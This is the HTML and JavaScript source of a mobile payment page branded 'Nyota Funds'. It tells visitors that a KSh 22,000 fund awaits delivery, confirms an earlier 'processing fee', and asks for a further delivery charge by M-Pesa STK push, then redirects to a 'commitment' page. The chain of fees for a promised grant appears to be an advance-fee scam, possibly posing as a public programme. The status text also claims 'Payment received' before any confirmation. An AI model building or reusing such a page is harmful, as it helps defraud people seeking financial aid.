<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Select Pay Delivery Charges - Nyota Funds</title>

<style>
*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#e8f5e9; 
    color:#222;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
    background:#fff;
    padding:22px 18px 18px;
    border-radius:18px;
    box-shadow:0 6px 24px rgba(0,0,0,0.10);
    text-align:center;
    border:1px solid #e8ece9;
}

h2{
    color:#176b2c;
    font-size:22px;
    font-weight:700;
    margin:2px 0 16px;
}

.success-box{
    background:#eaf7ed;
    color:#176b2c;
    padding:14px 12px;
    border-radius:12px;
    font-size:14px;
    line-height:1.5;
    margin-bottom:10px;
    border:1px solid #d5ecd9;
}

.confirm-box{
    background:#f5faef;
    color:#39733d;
    padding:11px 12px;
    border-radius:10px;
    font-size:14px;
    margin-bottom:15px;
    border:1px solid #e0ecd8;
}

.details-box{
    background:#fafcfb;
    padding:15px;
    border-radius:13px;
    text-align:left;
    font-size:14px;
    border:1px solid #e5ebe7;
}

.details-box p{
    margin:9px 0;
    line-height:1.45;
}

.details-box b{
    color:#333;
}

#fullName,
#phoneNumber{
    color:#176b2c;
    font-weight:600;
}

.method{
    position:relative;
    background:#fff;
    border:1.5px solid #d9dfdb;
    padding:13px 12px;
    border-radius:11px;
    margin-top:9px;
    transition:all .2s ease;
}

.method:hover{
    border-color:#238b3d;
    background:#f8fcf9;
}

.method label{
    display:flex;
    align-items:center;
    cursor:pointer;
    font-size:14px;
    color:#333;
    line-height:1.4;
}

.method input{
    width:18px;
    height:18px;
    margin:0 10px 0 0;
    accent-color:#188038;
    flex-shrink:0;
}

.fee{
    margin:16px 0 0 !important;
    padding:13px;
    background:#eef8f0;
    border-radius:10px;
    text-align:center;
    color:#176b2c !important;
    font-size:15px;
    border:1px solid #d8ecd9;
}

.fee span{
    font-size:20px;
    font-weight:700;
}

button{
    width:100%;
    padding:15px;
    margin-top:15px;
    border:none;
    border-radius:11px;
    background:#176b2c;
    color:#fff;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    box-shadow:0 4px 10px rgba(23,107,44,0.20);
    transition:background .2s ease, transform .1s ease;
}

button:hover{
    background:#125823;
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:#9ca3a0;
    cursor:not-allowed;
    box-shadow:none;
}

#status{
    min-height:20px;
    margin-top:12px;
    font-size:13px;
    line-height:1.4;
    color:#555;
}

.secure{
    margin:13px 0 0;
    font-size:12px;
    color:#777;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .container{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h2{
        font-size:20px;
    }

    .details-box{
        padding:12px;
    }

    .method{
        padding:11px 9px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}


</style>

</head>

<body>

<div class="container">

<h2>Select Pay Delivery Charges</h2>

<div class="success-box">

Great news 🎉 <br>

Your NYOTA FUNDS is ready for delivery

</div>

<div class="confirm-box">

✅ Processing fee confirmed

</div>

<div class="details-box">

<p>
<b>NYOTA FUND:</b> KSh 22,000
</p>

<p>
<b>Full Name:</b>
<span id="fullName">Loading...</span>
</p>

<p>
<b>Phone Number:</b>
<span id="phoneNumber">Loading...</span>
</p>

<b>Select Delivery Method</b>

<div class="method">

<label>

<input
type="radio"
name="delivery"
value="2"
onclick="updateFee()"
>

Safaricom M-Pesa — KSh 2

</label>

</div>

<div class="method">

<label>

<input
type="radio"
name="delivery"
value="550"
onclick="updateFee()"
>

Bank Account — KSh 550

</label>

</div>

<p class="fee">

Delivery Fee:
KSh <span id="deliveryFee">--</span>

</p>

</div>

<button id="payButton" onclick="payDelivery()">

Pay Delivery Charges

</button>

<div id="status"></div>

<p class="secure">

🔒 Secure STK Push • Instant Confirmation

</p>

</div>


<script>

// ==========================================
// LOAD APPLICANT DETAILS
// ==========================================

document.getElementById("fullName").innerText =
localStorage.getItem("fullName") || "Applicant";

document.getElementById("phoneNumber").innerText =
localStorage.getItem("phoneNumber") || "07XXXXXXXX";


// ==========================================
// UPDATE DELIVERY FEE
// ==========================================

function updateFee(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(selected){

        document.getElementById("deliveryFee").innerText =
            selected.value;

    }

}


// ==========================================
// PAY DELIVERY
// ==========================================

async function payDelivery(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(!selected){

        alert("Please select delivery method.");

        return;
    }


    const phone =
        localStorage.getItem("phoneNumber");


    if(!phone){

        alert("Phone number not found.");

        return;
    }


    const amount =
        Number(selected.value);


    const status =
        document.getElementById("status");


    const button =
        document.getElementById("payButton");


    button.disabled = true;

    button.innerText =
        "Processing...";


    status.innerText =
        "Sending STK Push...";


    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        phone:phone,
                        amount:amount
                    })
                }
            );


        const data =
            await response.json();


        console.log(
            "STK RESPONSE:",
            data
        );


        if(!response.ok){

            throw new Error(
                data.message ||
                "STK Push failed"
            );

        }


        // ==================================
        // GET PAYLOR TRANSACTION ID
        // ==================================

        const transactionId =
            data.transactionId ||
            data.checkout_request_id ||
            data.data?.transactionId ||
            data.data?.checkout_request_id;


        if(!transactionId){

            console.error(
                "No transaction ID found:",
                data
            );

            throw new Error(
                "Payment reference was not returned."
            );

        }


        console.log(
            "PAYMENT ID:",
            transactionId
        );


        status.innerText =
            "📱 STK Push sent. Please enter your M-PESA PIN.";


        // Start checking payment

        checkPayment(transactionId);


    }catch(error){

        console.error(
            "STK ERROR:",
            error
        );


        button.disabled = false;

        button.innerText =
            "Pay Delivery Charges";


        status.innerText =
            "❌ Failed to send STK Push.";

    }

}


// ==========================================
// CHECK PAYMENT STATUS
// ==========================================

function checkPayment(transactionId){

    console.log(
        "Checking payment:",
        transactionId
    );


    const interval =
        setInterval(async()=>{

            try{

                // ==================================
                // DEBUG TRANSACTION ID
                // ==================================

                console.log(
                    "SENDING PAYMENT STATUS:",
                    {
                        transactionId: transactionId
                    }
                );


                const response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method:"POST",

                            headers:{
                                "Content-Type":"application/json"
                            },

                            body:JSON.stringify({

                                checkout_request_id:
                                    transactionId,

                                transactionId:
                                    transactionId,

                                transaction_id:
                                    transactionId

                            })
                        }
                    );


                const result =
                    await response.json();


                console.log(
                    "PAYMENT STATUS:",
                    result
                );


                // ==================================
                // GET PAYMENT STATUS
                // ==================================

                const paymentStatus =
                    String(
                        result.status ||
                        result.data?.status ||
                        result.data?.data?.status ||
                        ""
                    ).toLowerCase();


                // ==================================
                // COMPLETED
                // ==================================

                if(
                    paymentStatus === "completed" ||
                    paymentStatus === "success"
                ){

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "✅ Delivery charges paid successfully.";


                    setTimeout(()=>{

                        window.location.href =
                            "commitment.html";

                    },1000);

                }


                // ==================================
                // CANCELLED
                // ==================================

                else if(
                    paymentStatus === "cancelled"
                ){

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "❌ Payment cancelled.";


                    document.getElementById("payButton").disabled =
                        false;


                    document.getElementById("payButton").innerText =
                        "Pay Delivery Charges";

                }


                // ==================================
                // FAILED
                // ==================================

                else if(
                    paymentStatus === "failed"
                ){

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "❌ Payment failed.";


                    document.getElementById("payButton").disabled =
                        false;


                    document.getElementById("payButton").innerText =
                        "Pay Delivery Charges";

                }


                // ==================================
                // PENDING
                // ==================================

                else{

                    document.getElementById("status").innerText =
                        "⏳ Payment received. Confirming payment...";

                }


            }catch(error){

                console.error(
                    "STATUS ERROR:",
                    error
                );

            }

        },3000);

}

</script>

</body>
</html>
